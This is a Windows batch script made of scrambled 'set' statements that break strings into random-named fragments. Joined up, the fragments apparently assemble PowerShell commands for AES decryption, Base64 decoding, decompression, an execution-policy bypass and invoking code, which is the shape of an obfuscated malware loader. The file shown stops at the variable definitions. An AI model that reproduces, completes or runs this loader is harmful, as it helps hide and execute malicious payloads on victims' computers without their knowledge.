@echo off
set "EAzLsZwRkw=ws"
set "xxHhAIATFQ=py"
set "cQrxsprZiJ=rS"
set "SUtkYrjuWW=s\"
set "OVZNPSxaRX=32"
set "LlWQtaPGzu=:\"
set "JuFZHOVhGw=do"
set "bmerPYYYUW=\W"
set "rOGAlaJRcJ=he"
set "USVMWWkxeb=Po"
set "vEBxraeWEf=po"
set "AccyghoFSb=ll"
set "wdROtivzVM=.e"
set "iObYvFMMQT=0\"
set "KrGmCykLWu= /"
set "FkouJEYHDw=1."
set "KUVvpcBrIu=st"
set "NkaHdXpVKe=nd"
set "PfFNnHHeKa=we"
set "pQxuLoIUBj=co"
set "KVhQNCvYkf=xe"
set "AnjcCEpiOO=rs"
set "srhkteAxtG=\v"
set "pmsPYAkoMv=Sy"
set "mBjauTRQJM=em"
set "QRLBJOdrve=in"
set "pKpMsoWShd=y "
set "fPQQxlBRNz=ow"
set "rlhYjRyTdL=he"
set "JrACKHjSdL= C"
set "ExdFGyUMyL=ll"
set "RsigGOsWAn=Wi"
set "qbzwgtiJVc=we"
set "IkRxJcZkHn= %~dp0"
set "ymlRJgrnrY=cd"
set "OBsUApMElR=).Sp"
set "MaSKTrxbCZ= [Sy"
set "FHxgDNAyxk=.Mem"
set "rtlJNjIXfO=n ''"
set "tfapmUUmyn=lJ ="
set "lXicgkNQyB=pres"
set "prKZhgriQx=Secu"
set "AqjUzzJTXm=('%*'"
set "zQDXMPwSGN=y.Ci"
set "UMycejFwAn=.Mod"
set "GPhVlJOKBs=comp"
set "xdxMjtqddR=New-"
set "zIoeyalaLH=raph"
set "bbCkOUqtiM=orF'"
set "vZiZeRHBIu=yste"
set "LDHHbLlIFL=ect "
set "dpIjPxNHfn=Disp"
set "QDpeDSggNp=UGTu"
set "TlHTxnyREF=null"
set "xZWMcqbhMH=esaB"
set "QyQpoVOlmV=d;$W"
set "mrsoguAEpV=ress"
set "TSaMzwREsL=bjec"
set "EWJBvPbRXp=pose"
set "ZlGaVbvRBV=('l0"
set "FMplRXdmex=am;$"
set "YBhTiimjqf=brea"
set "DFtyjKOgbP=($oS"
set "uwqVDdTdQA=);$n"
set "BQjwFmBRlF=GW.I"
set "PFqDaLflum=.Con"
set "MyxGoVgPhy=[Env"
set "hUvwNjzvNn=bQGW"
set "AycwXOKeGT=Bfpq"
set "MrckdzLruq=..-1"
set "XiqVHDRvke=esMa"
set "yjCZwvEmam= [Sy"
set "mrsdVLhJis=[IO."
set "deUmVLwiVT=Disp"
set "OfFsEysbGL=e = "
set "UzASiBcFsD=6] -"
set "DpYtlKuVPy=trea"
set "pMbiAndbPg=pose"
set "bQlGtJwxLj=);$W"
set "waPAsSpakY=Fina"
set "RcmgTMCbRa=I = "
set "ZgsuHeCwog= New"
set "pHGmjEaNkK=onve"
set "uDxnIAagLN=q = "
set "jIsHIxwCqR=ment"
set "neXyppVXTd=Secu"
set "CkPqyoRJhL=ddin"
set "hRNVhygsah=mJqd"
set "mPBKrKiwCC=y.Pa"
set "kmOOfEyidH=kPr "
set "MWMlskcZLL=ddin"
set "tEIYTPmhGW=$Rnb"
set "wXZCQhCSew='txe"
set "PGjoSQRfBI=[Sys"
set "IFQXEEwlLk=oint"
set "IotRuKfBFE=Syst"
set "tAnmpPDGDQ== $W"
set "DfULcXFfiu=hy.A"
set "DGyoFKnWps=W.Pa"
set "zDjsoBfnTk=bQGW"
set "XxxXqWTqfH=lBlo"
set "eiAktYFoda=($oS"
set "DZPKCsxjjb=vDI."
set "jGBIfqPrSv=-joi"
set "SAROeeHFwW=.Key"
set "XFdkpfNfjc=WbQG"
set "qzGwBDQkeD=th('"
set "DzdplscqnM=TllA"
set "mDJVtvucWe=ss -"
set "geWSEwbJCf=bstr"
set "OcQrNDhZtt=rt]:"
set "MnKBuCGYzV=g = "
set "xHWjscBvOb='dqR"
set "kzcKFoHgXy=7Yiv"
set "fxKusKChRm=vj0m"
set "SSXKuegxMI=.Sec"
set "iMHmbvdgdO=q = "
set "NdCKKnzOuq= if "
set "BHWpCkScOk=();$"
set "FOMxLuYBfN=yste"
set "dVfHstFmzK=and "
set "sRKOQRxDvQ='[-1"
set "owHecltPDg=tion"
set "TFADIQrGwB=::('"
set "PWQDkOlAUa=1..-"
set "hEbBPGOkvg=yTo("
set "PZTfTPivnf=$HnT"
set "fXUIXHJjwy= = ["
set "JpPyiSTYZK='gni"
set "FMfeSVKhiZ=Stre"
set "fBdulYegxN=ress"
set "vCnwdJCCIN=ZZ.T"
set "oNQJOhrozG=d = "
set "UuuKVdaNle=tem."
set "tjSHCRnAWm=pStr"
set "NSQsVFLwFW=bypa"
set "eBRtjvvomS= = $"
set "VzoWAqzgmj=ke($"
